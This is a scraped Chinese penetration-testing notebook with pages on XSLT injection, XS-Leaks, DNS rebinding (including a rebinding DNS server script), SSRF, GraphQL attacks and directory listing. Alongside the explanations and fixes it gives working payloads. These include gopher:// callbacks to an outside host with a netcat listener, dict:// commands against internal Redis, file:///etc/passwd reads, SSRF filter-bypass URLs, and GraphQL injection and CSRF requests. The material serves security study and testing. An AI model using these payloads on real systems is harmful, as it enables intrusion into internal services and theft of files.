前面都是考虑到可以完全控制XSL文件的情况，但如果只能控制其中的一部分内容的话，又该怎么利用呢？ 攻击者通过将XSLT文档和外部文档组合来打破这种限制，import和incldue函数可以达到这样的效果。在加载外部文件时，整个文档将被解析。如果攻击者可以控制这个过程，那么他们可以使用XXE和在外部文件中使用内嵌脚本这两种攻击方式。 外部文件可能是之前上传到服务器上的文件，或者从外部通过URL引用的文件，只要文件内容是XML格式即可。 当xsl:include在其他地方使用时，xsl:import标签只能作为xsl:stylesheet标签的第一个子标签。 利用前需要闭合之前的标签，然后再插入我们注入的语句 比如 插入后构造出的XSL Fruits: - : 安全建议 尽可能避免使用用户提供的XSLT文档 不要使用不受信任的输入去生成XSLT文档，比如拼接字符串。如果需要非静态值，则应将其包含在XML数据文件中，并且仅由XSLT文档引用 明确禁止使用XSLT库实现的危险功能。查阅库的文档如何禁用XML外部实体、document()函数、import和include标签。确保嵌入脚本扩展是禁用的，同时其他允许读或写外部文件的专用扩展也禁用。 参考 【译】XSLT attack XSLT - 转换 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-08 15:12:17 "},"个人知识库/01.渗透测试/02.WEB漏洞/11.XS-Leaks/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/11.XS-Leaks/","title":"11.XS-Leaks","keywords":"","body":" 什么是XS-Leaks 产生原因&使用场景 漏洞举例 如何检测返回结果？ 检测返回结果举例 基于错误事件 基于执行时间 其他 漏洞实例 小技巧 防御 参考 什么是XS-Leaks 注意：有点难利用！！！但是不代表没有可以利用的，算是比较鸡肋吧 跨站泄漏（Cross-site leaks，又名XS-Leaks, XSLeaks），详细一点名字就是HTTP跨站缓存泄漏，能用来探测用户敏感信息。 它的利用方式和利用条件等都与CSRF较为相似，主要区别在于XS-Leaks不是允许其他网站代表用户执行操作，而是可以用于推断有关用户的信息。 产生原因&使用场景 具有模糊查询的功能，请求结果只会返回两种有差异的结果（比如true或者false，不是说必须返回true或者false，只是说返回结果是2种有差异的类型），且这种二元结果的差异性可以通过某种侧信道技术探测到。 因为这玩意儿和CSRF类似，所以GET请求或者POST请求都是可以构造的 漏洞举例 只是上面说几句，感觉还是有点模糊，举个例子，比较好说明 前提条件：网站不允许直接访问其他网站上的数据，但可以从其他网站加载资源并观察副作用。 例如，evil.com被禁止显式读取来自bank.com的响应，但evil.com可以尝试从bank.com加载脚本并确定它是否成功加载。 假设bank.com有一个API接口，它返回的内容是：给定类型的交易的用户订单信息 访问bank.com/my_receipt?q=tv，如果用户购买了电视，那么将会返回状态码200，如果用户没有购买电视，那么将会返回状态码404 这个时候咱们通过返回的状态码是200还是404，就可以推断出用户买没买电视 同理，通过类似的一些关键词，就可以推断出用户买了哪些东西 如何检测返回结果？ 前面也说了，这玩意儿和CSRF类似，那肯定是不能直接获取到返回结果的，只能通过某些其他的技术来获取返回的二元结果，那我们怎么知道他到底返回的是true还是false呢？ 主要用到了3种手法： 浏览器APIs (比如计帧法（Frame Counting）和计时攻击（Timing Attacks）) 浏览器实现细节和bugs (比如连接池（Connection Pooling）和类型必须匹配（typeMustMatch）) 硬件bugs (比如推测执行攻击（Speculative Execution Attacks）) 检测返回结果举例 基于错误事件 function probeError(url) { let script = document.createElement('script'); script.src = url; script.onload = () => console.log('Onload event triggered'); script.onerror = () => console.log('Error event triggered'); document.head.appendChild(script); } // 因为 https://www.baidu.com/xxx 返回HTTP 404,触发执行onerror事件 probeError(\"https://www.baidu.com/xxx\"); // 因为 https://www.baidu.com/ 返回HTTP 200,触发执行onload事件 probeError(\"https://www.baidu.com/\"); 基于执行时间 // Open a new window to measure how long the window blocks the event loop // for the site example.org window.open('https://example.org/expensive'); // TODO: Wait for the expensive window to load, e.g. via timeout // then create an iframe to the same site var ifr = document.createElement('iframe'); ifr.src = \"https://example.org\"; document.body.appendChild(ifr); // Measure the initial time var start = performance.now(); ifr.onload = () => { // When the iframe loads calculate the time difference var time = performance.now() - start; console.log('It took %d ms to load the window', time); } 其他 参考 https://xsleaks.dev/ 漏洞实例 实例9400$：XS-Searching Google’s bug tracker to find out vulnerable source code 小技巧 如果第一个 URL 已成功加载，则在更改 URL 的哈希部分时，将不会再次触发 onload 事件。 但是如果页面在加载时出现某种错误，那么 onload 事件将再次触发。 URL1: www.attacker.com/xssearch#try1 URL2: www.attacker.com/xssearch#try2 防御 和CSRF一样，判断referer，或者增加token 其他的专属方法参考：https://xsleaks.dev/docs/defenses/ 参考 比较全面的文档：https://xsleaks.dev/ Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-08 15:12:17 "},"个人知识库/01.渗透测试/02.WEB漏洞/12.SSRF/01.DNS重绑定.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/12.SSRF/01.DNS重绑定.html","title":"01.DNS重绑定","keywords":"","body":" 前言 DNS重绑定 实现方法 ceye 基础自建 singularity 安装配置 基础使用 Manager UI说明 参考文章 前言 SSRF绕过的一种思路，就是利用DNS重绑定，它也被广泛用于绕过同源策略，本质就是欺骗客户端请求的IP地址。 但是之前都是用如xip.io等别人搭建好的平台去利用，没有自己搞过，也没能彻底理解其中的原理 DNS重绑定 浏览网页过程中，用户在地址栏中输入包含域名的网址，浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。即 域名 => 公共DNS服务器 => IP 但是作为域名的所有者，可以随时设置解析IP，举例如下： 用户第一次访问，解析域名test.gm7.org的IP为104.21.26.222 在用户第二次访问前，修改域名解析的IP为127.0.0.1 用户第二次访问，解析域名test.gm7.org的IP为127.0.0.1 [!tip] 一般来说我们的操作系统默认能够将DNS返回来的这个IP地址信息保存60秒，而超过60秒后如果需要再次访问这个域名，就会重新去请求一次dns 对于浏览器来说，两次访问的都是同一域名，是符合浏览器的同源策略的，但是第二次访问解析到其他IP，调用到了其他资源。这样的行为被称之为域名重新绑定攻击（DNS ReBinding）。 [!tip] 简而言之：当我们发起域名解析请求的时候,第一次访问会返回一个ip地址A，但是当我们发起第二次域名解析请求的时候，却会返回一个不同于A的ip地址B。 实现方法 ceye ceye.io个人信息最下方，可以设置解析IP，具体说明：http://ceye.io/dns-rebinding 有一个注意点：就是每次都是随机返回一个设置的IP，所以可能大概率碰运气 验证： 重绑定使用域名：r.abcdef.ceye.io or *.r.abcdef.ceye.io 基础自建 前提是有域名，然后增加一个A记录和一个NS记录 此时访问dra.gm7.org域名，先解析该域名的DNS域名为dr.gm7.org，指向10开头的这台服务器。 在10开头的这台服务器上，运行如下python脚本 [!tip] 在ubuntu中，可能会遇到53端口被占用情况，可以尝试 service systemd-resolved stop service named stop # pip2 install twisted # sudo python2 thiss.py from twisted.internet import reactor, defer from twisted.names import client, dns, error, server record={} class DynamicResolver(object): def _doDynamicResponse(self, query): name = query.name.name if name not in record or record[name] \" + ip answer = dns.RRHeader( name = name, type = dns.A, cls = dns.IN, ttl = 0, payload = dns.Record_A(address = b'%s' % ip, ttl=0) ) answers = [answer] authority = [] additional = [] return answers, authority, additional def query(self, query, timeout=None): return defer.succeed(self._doDynamicResponse(query)) def main(): factory = server.DNSServerFactory( clients=[DynamicResolver(), client.Resolver(resolv='/etc/resolv.conf')] ) protocol = dns.DNSDatagramProtocol(controller=factory) reactor.listenUDP(53, protocol) reactor.run() if __name__ == '__main__': raise SystemExit(main()) singularity A DNS rebinding attack framework. https://github.com/nccgroup/singularity wiki: https://github.com/nccgroup/singularity/wiki 主要针对绕过SOP，也可用于绕过SSRF 安装配置 [!note] 也需要一个域名，域名配置和上面自建一样，一个A记录一个NS记录 安装：需要go环境 git clone https://github.com/nccgroup/singularity cd singularity/cmd/singularity-server go build 部署web界面： 给二进制文件移动到html目录同级 直接运行二进制文件即可启动 访问管理页面：8080端口 基础使用 进入管理页面，输入参数，开始攻击后拿到域名 multiple answers策略设置下的效果 其他Rebinding Strategy说明见下方，在multiple answers策略下，浏览器会拿到多个dns响应，首先会尝试用第一个连接，失败之后就会尝试另一个，这时就实现了DNS重绑定。这个其实算是一个正常功能，也非常常见，可以说是DNS层面的负载均衡技术。 Manager UI说明 manager web界面是配置和启动DNS重新绑定攻击的地方。默认情况下，它监听端口8080。下表介绍了管理器界面中的所有表单字段和按钮： Field Name Description Attack Host Domain This is the (sub-)domain where the Singularity web server is running. Default value: d.rebind.it Attack Host This is the IP address where the manager and the attack payloads are hosted. Default value: xxx.xxx.xxx.xxx Target Host This is the IP address or FQDN (e.g. jenkins.internal.target.com) of the target system where the victim (target) application is running. Default value: 127.0.0.1 Target Port This is the port where the victim (target) application is listening on. Default value: 8080 Request New Port This will request Singularity to listen on a new port. This feature is only available when Singularity has been started with the -dangerouslyAllowDynamicHTTPServers command line option. Attack Payload This is where you select the payload, i.e. which application you are trying to exploit. Start Attack Start the DNS rebinding attack. Be patient and wait for at least one minute. Open the browser web console to see debugging logs. Toggle Advanced Options This button will enable the advanced fields described below. Rebinding Strategy Specify how to respond to DNS queries from a victim client. The following options are available: First then second (default, conservative): This is the default value. It should work on most if not all platforms in 40 to 60 seconds. Multiple answers: Near instant DNS rebinding attack! Make sure to set the interval option described below to 1 second and the target address if attacking the local host to \"0.0.0.0\" for Unix-like platforms (e.g. Linux, macOS) and to \"127.0.0.1\" (or any other valid local host addresses) for Microsoft Windows. Round robin (IPS/filters evasion): Alternate DNS responses between the attack and target host IP addresses. Random (IPS/filters evasion): Randomly alternate DNS responses between the attack and target host IP addresses. Interval How long to wait between connection attempts to the target application in seconds. Default value: 20 Flood DNS Cache Perform ~1000 DNS queries to evict cached DNS entries in Google Chrome and to improve DNS rebind attack speed from ~60s down to ~20s. Useful with the following DNS rebinding strategies: First then second, Round robin, Random. Default value: unset Index Token The index token is used by Singularity to detect if the rebinding has happened yet. Default value: thisismytesttoken. 参考文章 从0到1认识DNS重绑定攻击 abusing-dns-browser-based-port-scanning-and-dns-rebinding DNS Rebinding in Browser Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-02-23 10:01:52 "},"个人知识库/01.渗透测试/02.WEB漏洞/12.SSRF/SSRF.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/12.SSRF/SSRF.html","title":"SSRF","keywords":"","body":" 漏洞介绍 漏洞原理 漏洞危害 漏洞类型 利用场景 常见语言及支持协议 gopher dict file http/s 如何验证 工具 修复方案 绕过 使用其他协议 利用解析URL所出现的问题 短地址 + 302跳转 绕过 DNS重绑定 更改IP地址写法 添加端口可能绕过匹配正则 滥用封闭的字母数字 *nix技巧 参考 漏洞介绍 SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种由攻击者构造请求，利用服务器端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务器端发起的，所以服务器能请求到与自身相连而外网隔离的内部系统）。 靶场推荐： https://github.com/m6a-UdS/ssrf-lab https://github.com/incredibleindishell/SSRF_Vulnerable_Lab 缺陷代码参考： # 模拟SSRF，使用curl发起网络请求后返回客户端，请求加载文件 Example： GET /index.php?url=http://10.1.1.1/ HTTP/1.1 Host: example.com 攻击者不能直接访问10.1.1.1，但可以通过http://example.com 的服务器去访问 http://10.1.1.1；这就是SSRF漏洞 漏洞原理 SSRF漏洞的形成大多是由于服务端提供了从其他服务器应用发起请求获取数据的功能，但没有对目标地址做过滤与限制；攻击者可以任意修改获取数据的地址，向指定的URL地址发起请求，获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。 简而言之：SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。 漏洞危害 SSRF的最大的危害在于穿透了网络边界，但具体能做到哪种程度还需要根据业务环境来判断 [!NOTE] 例如我们在SSRF的利用中，如果需要更深一步扩展，第一反应通常是去攻击可利用的redis或者memcache等内网服务拿shell，但需要注意的是操作redis，memcache的数据包中是需要换行的，而http/https协议一般无法满足我们要求，所以即使内网存在可利用的redis，也并非所有的ssrf都能利用成功的。但是，对于memcache来说，即使只能使用https协议，利用memcache来getshell却并非不可能 扫描内网，获取端口开放情况、banner信息等 对内网的一些系统进行攻击，如SQL注入 读取任意文件 无视CDN ... 漏洞类型 主要分为两种，有回显和无回显 有回显的就比较简单，会将获取到的数据直接返回攻击者 无回显的则比较难，一般可以通过响应时间、内容长度等来判断 利用场景 网页中数据库验证的功能点 有远程图片加载的地方 网站提供的各种下载功能点 未公开的api实现及调用URL的功能 ... [!TIPS] 简单来说：所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞 常见语言及支持协议 cURL支持大量的协议，而gopher、file和dict协议是最好用的 比如在redis中，直接使用dict协议就可以攻击内网的redis服务 dict://127.0.0.1:6379/set x d4m1ts gopher gopher：gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）。 公网IP的VPS监听 2333 端口 [root@host ~]# nc -lvp 2333 Ncat: Version 6.40 ( http://nmap.org/ncat ) Ncat: Listening on :::2333 Ncat: Listening on 0.0.0.0:2333 利用 gopher 协议访问 浏览器直接访问或者用 curl url http://127.0.0.1/ssrf.php?url=gopher://66.112.213.76:2333/_hello 收到回显 [root@host ~]# nc -lvp 2333 Ncat: Version 6.40 ( http://nmap.org/ncat ) Ncat: Listening on :::2333 Ncat: Listening on 0.0.0.0:2333 Ncat: Connection from 183.xxx.xxx.xxx. Ncat: Connection from 183.xxx.xxx.xxx:9661. hello dict 因为此处 ssrf.php 的漏洞代码有回显，所以浏览器直接访问 http://127.0.0.1/ssrf.php?url=dict://127.0.0.1:6379/info 或者终端 curl http://127.0.0.1/ssrf.php?url=dict://127.0.0.1:6379/info 可以获取Redis的配置信息 同理也可以添加或者查看Redis的信息 查看Redis存储的内容 file 利用 file 协议可以读取任意内容 前提也是在有回显的情况下 http://127.0.0.1/ssrf.php?url=file:///etc/passwd http/s 探测内网主机存活，也可以结合一些只需要Get的payload进行攻击利用 如何验证 一般来说，目标出网的情况下，验证采用dnslog的方式，看能不能在Dnslog收到请求 如果目标不出网，则可以根据返回包的特征来进行判断，如目标端口开放响应时间200Ms，未开放则响应时间1000ms等 工具 深入利用基本上也就是各种协议➕Payload https://github.com/xmsec/redis-ssrf https://github.com/swisskyrepo/SSRFma https://github.com/search?q=redis+ssrf 修复方案 比较形象的SSRF修复方案： 统一错误的信息 限制协议为HTTP、HTTPS 去除URL中的特殊字符 禁止30x跳转 设置URL白名单或者Host白名单 限制内网IP（如果是URL可以改为IP后再判断） 绕过 使用其他协议 不一定非得用http/s，有时候试试其他的可能危害更大 file:///etc/passwd 利用解析URL所出现的问题 在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。 https://www.baidu.com@google.com 与 https://google.com 是一样的 http://google.com:80+&@127.88.23.245:22/#+@google.com:80/ http://127.88.23.245:22/+&@google.com:80#+@google.com:80/ http://google.com:80+&@google.com:80#+@127.88.23.245:22/ http://127.88.23.245:22/?@google.com:80/ http://127.88.23.245:22/#@www.google.com:80/ 短地址 + 302跳转 绕过 window.location.href = \"https://baidu.com/\"; 如果过滤了IP可以用网上的短地址 辅助脚本302.php—-bypass http协议限制 DNS重绑定 利用 xip.io 和 xip.name 网站：http://xip.io/ 现在好像用不了了，可以自建，如使用singularity，参考：DNS重绑定 更改IP地址写法 ip地址转换成进制来访问 220.181.57.216 十六进制 = DCB539D8 十进制 = 3702864344 http://0xDCB539D8 http://3702864344 在线转换 http://www.ab126.com/system/2859.html 或者IP地址部分地方转换为进制来表达 http://0xdc.181.57.216 添加端口可能绕过匹配正则 220.181.57.216:80 滥用封闭的字母数字 也叫 Enclosed alphanumerics字符集绕过，可以在网站中找到类似的字符 http://169。254。169。254/ http://169｡254｡169｡254/ http://⑯⑨。②⑤④。⑯⑨｡②⑤④/ http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/ http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/ http://②⑧⑤②⓪③⑨①⑥⑥:80/ http://④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80/ http://⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥:80/ http://⓪⓪②⑤①｡⓪⓪⓪③⑦⑥｡⓪⓪⓪⓪②⑤①｡⓪⓪⓪⓪⓪③⑦⑥:80/ http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]:80/ http://[::ⓕⓕⓕⓕ:①⑥⑨。②⑤④。⑯⑨。②⑤④]:80/ http://⓪ⓧⓐ⑨。⓪③⑦⑥。④③⑤①⑧:80/ http://⓪ⓧⓐ⑨｡⑯⑥⑧⑨⑥⑥②:80/ http://⓪⓪②⑤①。⑯⑥⑧⑨⑥⑥②:80/ http://⓪⓪②⑤①｡⓪ⓧⓕⓔ｡④③⑤①⑧:80/ *nix技巧 在Mac和Linux中，0.0.0.0 等价于 127.0.0.1 参考 SSRF安全指北 SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-1 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-02-23 09:54:02 "},"个人知识库/01.渗透测试/02.WEB漏洞/13.GraphQL测试/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/13.GraphQL测试/","title":"13.GraphQL测试","keywords":"","body":" 前言 环境搭建 基础使用 添加数据 query查询数据 mutation修改数据 漏洞利用 敏感信息泄漏与越权 Express-GraphQL Endpoint CSRF漏洞 GraphQL注入漏洞 debug模式下的信息泄漏 嵌套拒绝服务 参考 前言 某次项目中遇到graphql，感觉之前没有系统的总结学习过，所以补充记录一下 [!NOTE] 个人感觉就是一个ORM框架 GraphQL 是 Facebook 开发的一种 API 的查询语言，与 2015 年公开发布，是 REST API 的替代品。 GraphQL 既是一种用于 API 的查询语言也是一个满足你数据查询的运行时。 GraphQL 对你的 API 中的数据提供了一套易于理解的完整描述，使得客户端能够准确地获得它需要的数据，而且没有任何冗余，也让 API 更容易地随着时间推移而演进，还能用于构建强大的开发者工具。 官网：graphql.org 中文网：graphql.cn 环境搭建 遇到的情况相对较少，所以建议自己搭建一个测试环境，一般尽量使用docker来节省我们的时间，我使用的是graphql-engine 创建一个docker-compose.yaml文件，写入如下内容（需要依赖数据库postgreql，所以建议用docker-compose来） version: '3.6' services: postgres: image: postgres:9.6 restart: always environment: - \"POSTGRES_PASSWORD=password\" #\"password\"为要设置的数据库密码 ports: - \"5432:5432\" #前:后 前为宿主机端口号，后为容器端口号 端口映射 volumes: - ./db_data:/var/lib/postgresql/data #数据库目录映射 前为宿主机，后为容器 graphql-engine: image: hasura/graphql-engine:latest ports: - \"9080:8080\" depends_on: - \"postgres\" restart: always environment: HASURA_GRAPHQL_DATABASE_URL: postgres://postgres:password@host.docker.internal:5432/test #连接数据库，其他的不用管，注意里面数据库密码要符合上文 HASURA_GRAPHQL_ENABLE_CONSOLE: \"true\" # set to \"false\" to disable console HASURA_GRAPHQL_ENABLED_LOG_TYPES: startup, http-log, webhook-log, websocket-log, query-log ## uncomment next line to set an admin secret HASURA_GRAPHQL_ADMIN_SECRET: password #\"password\"为hasura登录密码 执行如下命令进行下载启动镜像 docker-compose up -d 这个时候访问9080是打不开的，因为环境还有点问题，查看容器日志，可以发现是数据库的问题，没有test这个数据库，我们连接进去创建一个即可 docker logs a2a 可以用图形化界面navicat，也可以连接进postgresql容器内部创建数据库 create database test; 重启容器graphql-engine docker restart a2abf9bc3297 然后访问http://localhost:9080/即可 登陆后 bingo!!! 基础使用 简单的介绍下使用即可，就没记录基础的内容了，比如类型有哪些等等。。。 添加数据 默认是没有内容的，可以自己添加一个示例，往下滑可以看到添加内容的SQL语句 -- To uninstall demonstration: -- Delete the `_helloworld` schema from the expanded page on the left -- or you may run: `DROP SCHEMA IF EXISTS _helloworld` from the SQL tab to the left -- -- Please be careful before running, as all data in the schema will be removed -- Create Schema CREATE SCHEMA _helloworld; -- Create Tables CREATE TABLE _helloworld.author ( id serial PRIMARY KEY, name text NOT NULL ); CREATE TABLE _helloworld.article ( id serial PRIMARY KEY, title text NOT NULL, rating integer DEFAULT NULL, author_id integer REFERENCES _helloworld.author(id) NOT NULL ); -- Insert Seed Data INSERT INTO \"_helloworld\".\"author\" (\"name\") VALUES ('Coleman Spickett'), ('Gallard Dreye'), ('Alysa Beecker'), ('Kellie Owbridge'), ('Mischa Sabban'), ('Jacquenetta Devo'), ('Martie MacKintosh'), ('Babb Attree'), ('Mitchel Andrews'), ('Jodie Deschelle'); INSERT INTO \"_helloworld\".\"article\" (\"author_id\", \"rating\", \"title\") VALUES (3, 3, 'Oh, hi , Marty. I didn''t hear you come in. Fascinating device, this video unit.'), (1, 1, 'Erased from existence.'), (6, 2, 'No no no, Doc, I just got here, okay, Jennifer''s here, we''re gonna take the new truck for a spin.'), (2, 4, 'Do you mind if we park for a while?'), (9, 1, 'Why am I always the last one to know about these things.'), (4, 1, 'Hey, George, buddy, you weren''t at school, what have you been doing all day?'), (9, 2, 'Yeah, but you''re uh, you''re so, you''re so thin.'), (10, 5, 'Right, okay, so right around 9:00 she''s gonna get very angry with me.'), (10, 5, 'Well looky what we have here. No no no, you''re staying right here with me.'), (7, 1, 'Of course I do. Just a second, let''s see if I could find it.'), (9, 1, 'Right, okay, so right around 9:00 she''s gonna get very angry with me.'), (6, 3, 'Marty, you''re acting like you haven''t seen me in a week.'), (5, 3, 'Can I go now, Mr. Strickland?'), (9, 5, 'Yes, yes, I''m George, George McFly, and I''m your density. I mean, I''m your destiny.'), (4, 4, 'We all make mistakes in life, children.'), (9, 3, 'Hey, George, buddy, you weren''t at school, what have you been doing all day?'), (3, 4, 'Uh, you mean nobody''s asked you?'), (8, 3, 'Just turn around, McFly, and walk away. Are you deaf, McFly? Close the door and beat it.'), (5, 1, 'His head''s gone, it''s like it''s been erased.'), (2, 5, 'Wait a minute, what are you doing, Doc?'), (2, 4, 'Marty, you interacted with anybody else today, besides me?'), (4, 2, 'I''m telling the truth, Doc, you gotta believe me.'), (4, 2, 'Yeah, but you''re uh, you''re so, you''re so thin.'), (10, 4, 'Alright, McFly, you''re asking for it, and now you''re gonna get it.'), (9, 3, 'And Jack Benny is secretary of the Treasury.'), (10, 3, 'Why am I always the last one to know about these things.'), (3, 5, 'Crazy drunk drivers.'), (3, 1, 'Why am I always the last one to know about these things.'), (9, 3, 'What''s that thing he''s on?'), (5, 3, 'Um, yeah well I might have sort of ran into my parents.'), (4, 3, 'Sam, here''s the young man you hit with your car out there. He''s alright, thank god.'), (10, 5, 'A block passed Maple, that''s John F. Kennedy Drive.'), (4, 1, 'Erased from existence.'), (1, 5, 'What''s that thing he''s on?'), (6, 3, 'Then how am I supposed to ever meet anybody.'), (4, 2, 'You know, Doc, you left your equipment on all week.'), (3, 5, 'Right, okay, so right around 9:00 she''s gonna get very angry with me.'), (5, 3, 'Mr. McFly, Mr. McFly, this just arrived, oh hi Marty. I think it''s your new book.'), (4, 1, 'Alright, McFly, you''re asking for it, and now you''re gonna get it.'), (1, 5, 'Oh, hi , Marty. I didn''t hear you come in. Fascinating device, this video unit.'), (2, 2, 'Can I go now, Mr. Strickland?'), (10, 3, 'Hey, George, buddy, you weren''t at school, what have you been doing all day?'), (3, 1, 'Wait a minute, what are you doing, Doc?'), (9, 1, 'I don''t know, but I''m gonna find out.'), (6, 4, 'Well, uh, listen, uh, I really-'), (5, 3, 'Hey kid, what you do, jump ship?'), (1, 3, 'Yeah, but you''re uh, you''re so, you''re so thin.'), (9, 1, 'Wait a minute, wait a minute. 1:15 in the morning?'), (5, 4, 'Hey kid, what you do, jump ship?'); query查询数据 先举个例子，这里不需要自己构造语句，点点点填空就行 实例：查询id>5的结果的name和id，并以降序desc排序 query MyQuery { _helloworld_author(order_by: {id: desc}, where: {id: {_gt: 5}}) { name id } } 转换成SQL语句就是，可见用graphql语法要简短很多很多 SELECT coalesce( json_agg( \"root\" ORDER BY \"root.pg.id\" DESC NULLS FIRST ), '[]' ) AS \"root\" FROM ( SELECT row_to_json( ( SELECT \"_1_e\" FROM ( SELECT \"_0_root.base\".\"name\" AS \"name\", \"_0_root.base\".\"id\" AS \"id\" ) AS \"_1_e\" ) ) AS \"root\", \"_0_root.base\".\"id\" AS \"root.pg.id\" FROM ( SELECT * FROM \"_helloworld\".\"author\" WHERE ((\"_helloworld\".\"author\".\"id\") > (('5') :: integer)) ) AS \"_0_root.base\" ORDER BY \"root.pg.id\" DESC NULLS FIRST ) AS \"_2_root\" 我们分析一下上面的graphql语句，就很清楚用法了 query MyQuery { _helloworld_author(order_by: {id: desc}, where: {id: {_gt: 5}}) { name id } } _helloworld_author函数名，可以随便取（这里是graphql-engine根据数据库数据自动生成的） 函数括号中，代表传入的参数 最后的name和id，就是要查询的结果 也可以用传入变量的方式查询内容 mutation修改数据 [!NOTE] 最下面可以直接选择Mutation 示例：添加作者test，id为1099 mutation MyMutation { insert__helloworld_author_one(object: {id: 1099, name: \"test\"}) { id name } } 语句也很简洁明了，分析一下也和查询类似，数据库中成功添加进数据 漏洞利用 敏感信息泄漏与越权 GraphQL是一门自带文档的技术。我们有时候会需要去问 GraphQL Schema 它支持哪些查询，GraphQL 通过利用内省系统，可列出 GraphQL中所有Query、Mutation、ObjectType、Field、Arguments。 查询存在的类型： { __schema { types { name } } } 测试过程中，我们可以根据获取到的接口和参数，去构造query查询，以便寻找敏感信息，如email、password、secret等，可以多关注废弃字段deprecated fields，也可以构造mutation语句去越权修改数据等 一些工具可以生成文档来辅助我们测试，工具列表： 1、https://github.com/2fd/graphdoc [!TIP|style:flat] 建议用下面的可以自动补全和发起请求的其他工具 2、chrome插件：https://chrome.google.com/webstore/detail/chromeiql/fkkiamalmpiidkljmicmjfbieiclmeij 如果graphql调用的接口需要鉴权，可以使用burp在中间进行处理 3、https://github.com/apollographql/apollo-client-devtools 也可以自动补全，部署环境比上面的chrome插件稍微复杂点 4、https://github.com/skevy/graphiql-app 和前面功能一样，但是是单独的APP，所以感觉最好用吧 5、InQL Scanner burp插件 https://github.com/doyensec/inql Express-GraphQL Endpoint CSRF漏洞 大概就是：默认graphql查询时，都是依赖于json数据格式进行传输给后端的，但是使用Express-GraphQL的时候，给json转换成form表单格式的数据也可以提交给后端正常处理，也就可以直接用burp生成的CSRF POC进行CSRF攻击了 原数据包： POST /? HTTP/1.1 Host: graphqlapp.herokuapp.com Origin: https://graphqlapp.herokuapp.com User-Agent: Graphiql/http Referer: https://graphqlapp.herokuapp.com/ Cookie: [mask] Content-Type: application/json Content-Length: 108 {\"query\":\"mutation {\\n editProfile(name:\\\"hacker\\\", age: 5) {\\n name\\n age\\n }\\n}\",\"variables\":null} 修改后也能使用的数据包： POST /? HTTP/1.1 Host: graphqlapp.herokuapp.com Origin: https://graphqlapp.herokuapp.com User-Agent: Graphiql/http Referer: https://graphqlapp.herokuapp.com/ Cookie: [mask] Content-Type: application/x-www-form-urlencoded Content-Length: 138 query=mutation%20%7B%0A%20%20editProfile(name%3A%22hacker%22%2C%20age%3A%20 5)%20%7B%0A%20%20%20%20name%0A%20%20%20%20age%0A%20%20%7D%0A%7D GraphQL注入漏洞 和SQL注入类似，都是通过修改执行的语句，改变执行语句的语义，达到攻击者想要的结果，比如修改数据、查询更多内容等 正常修改mutation语句 mutation MyMutation { update__helloworld_author(where: {id: {_eq: 1099}}, _set: {name: \"testtest\"}) { returning { id name } } } 恶意注入后 [!TIP] 先闭合前面的语句，再加函数或者其他内容即可，注入的恶意内容为 } insert__helloworld_author(objects: {id: 1088, name: \"injection\"}){ returning { name } mutation MyMutation { update__helloworld_author(where: {id: {_eq: 1099}}, _set: {name: \"aaa\"}) { returning { id name } } insert__helloworld_author(objects: {id: 1088, name: \"injection\"}){ returning { name } } } [!NOTE] 修复可以使用graphql参数化查询 debug模式下的信息泄漏 一般来说生产环境都需要禁用开发模式的，在Graphene-Django下开启debug模式，将会造成SQL语句信息泄漏 参考：https://docs.graphene-python.org/projects/django/en/latest/debug/ { # A example that will use the ORM for interact with the DB allIngredients { edges { node { id, name } } } # Here is the debug field that will output the SQL queries _debug { sql { rawSql params sql } } } 嵌套拒绝服务 根据服务器资源情况来看，如果有大量占用内存的情况，都可能导致服务器宕机。在Graphql查询的时候，如果有大量的嵌套，那么也有可能会造成拒绝服务漏洞。 如下：可以使用作者信息查询到文章信息，使用文章信息也可以查询到作者信息，一直无限制嵌套下去，就可能导致服务器宕机。 参考 【CuteJavaScript】GraphQL真香入门教程 GraphQL 从入门到实践 GraphQL漏洞笔记及案例 攻击GraphQL_phithon.pdf GraphQL安全指北 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-02-07 16:10:04 "},"个人知识库/01.渗透测试/02.WEB漏洞/14.列目录漏洞/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/14.列目录漏洞/","title":"14.列目录漏洞","keywords":"","body":" 介绍 举例 挖掘方法 主动 被动 修复方案 IIS Apache Nginx Tomcat 介绍 列目录漏洞也叫目录遍历漏洞 该漏洞是由于网站存在配置缺陷，目录没有默认首页文件或没有正确设置默认首页文件，会把整个目录结构列出来，将网站结构完全暴露给攻击者； 攻击者可能通过浏览目录结构，访问到某些包含敏感信息的文件（如phpinfo、管理后台、数据库连接文件、网站备份文件等）；扩大攻击面，使网站更容易被攻破。 举例 一个最简单的例子，就是用Python启动一个轻量级的服务器 python3 -m http.server 8000 使用浏览器访问http://127.0.0.1:8000/，如果当前目录下没有index.html，就可以获取到目录信息 挖掘方法 测试主要通过两种方法 主动 利用目录扫描工具进行扫描，如dirscan、yuhScan等，观察返回头信息，或者直接代入浏览器访问 